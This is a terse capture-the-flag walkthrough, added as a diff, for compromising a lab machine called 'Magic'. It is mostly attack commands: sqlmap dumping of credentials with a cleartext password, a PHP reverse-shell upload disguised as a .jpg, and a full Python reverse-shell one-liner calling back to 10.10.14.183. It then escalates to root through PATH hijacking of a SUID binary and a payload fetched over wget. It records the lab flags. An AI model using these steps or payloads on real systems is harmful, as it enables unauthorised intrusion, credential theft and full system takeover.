@@ -1,0 +1,68 @@
+
+Enumeration: nmap -sV 10.10.10.185
+
+visit:	http://10.10.10.185
+	http://10.10.10.185/login.php
+
+use burpsuite:
+- intercept login
+- copy to file, login.req
+
+use sqlmap:
+sqlmap -r login.req --level 3 --risk 3 --dbs --threads 10
+sqlmap -r login.req --level 3 --risk 3 -D Magic --tables --threads 10
+sqlmap -r login.req --level 3 --risk 3 -D Magic -T login --dump --threads 10
+
+username: admin
+password: Th3s3usW4sK1ng
+
+
+upload a .jpg file
+
+use burpsuite:
+- set browser connection
+- intercept
+- reset to no proxy
+- send to repeater
+- rename sent file to fool.php.jpg
+
+use revShell.php
+- paste revShell code to end of .jpg
+- send
+
+set listener : nc -nvlp [port]
+
+curl http://10.10.14.183/images/uploads/fool.php.jpg
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+cd /home
+su theseus
+cd /theseus
+cat user.txt: 5ecd011bb7eb427ea8c68b463c552f17
+
+
+Privilege Escalation:
+
+find / -perm -4000 -ls 2>/dev/null | grep -v snap
+use: /bin/sysinfo
+
+cd /tmp
+mkdir fool
+cd /fool
+
+
+nano lshw
+ctrl+v: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect( ("10.10.14.183",3750));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+export PATH=/tmp/fool:$PATH export PATH=/tmp/fool:$PATH
+
+python3 -m http.server
+wget http://10.10.14.183:8000/lshw
+
+nc -nvlp 3750
+/bin/sysinfo
+
+cd /root
+cat root.txt: 8160520c1277dd909991f8dc7f9c7388
+
